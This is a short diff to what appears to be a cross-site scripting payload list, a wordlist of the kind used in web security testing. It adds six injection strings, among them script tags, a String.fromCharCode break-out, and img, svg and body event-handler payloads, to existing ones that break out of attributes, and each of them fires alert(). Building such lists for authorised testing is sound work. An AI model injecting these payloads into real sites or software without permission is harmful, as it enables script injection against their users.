@@ -13,3 +13,9 @@
 "><input onfocus=alert('XSS') autofocus>
 "><button onclick=alert('XSS')>Click Me</button>
 "><details open ontoggle=alert('XSS')>XSS</details>
+'<script>alert("XSS1")</script>'
+'"><script>alert("XSS2")</script>'
+"';alert(String.fromCharCode(88,83,83))//"
+"<img src=x onerror=alert('XSS3')>"
+"<svg onload=alert('XSS4')>"
+"<body onload=alert('XSS5')>
